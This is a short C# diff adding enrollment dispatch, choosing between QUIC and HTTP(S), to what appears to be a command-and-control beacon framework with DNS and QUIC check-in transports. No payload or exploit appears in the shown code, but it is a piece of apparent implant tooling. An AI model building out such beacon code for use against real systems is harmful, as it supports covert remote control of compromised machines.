@@ -18,4 +18,13 @@ internal static class TransportSelection
         QuicCheckIn.Create(setup),
         DnsCheckIn.Create(setup),
     ];
+
+    // The enroll dispatch the URL shape picks (architecture.md Sec 8,
+    // enrollment over QUIC): an http(s) enroll URL runs the JSON enroll
+    // cycle, a quic-schemed one the frame exchange. The generated per-build
+    // selection keeps only the branches whose modules compiled.
+    public static async Task<Enrollment> EnrollAsync(EnrollDial dial, CancellationToken cancellationToken = default) =>
+        BeaconUrl.IsQuic(dial.EnrollUrl)
+            ? await QuicEnroll.EnrollAsync(dial, cancellationToken)
+            : await C2.EnrollAsync(dial, cancellationToken);
 }
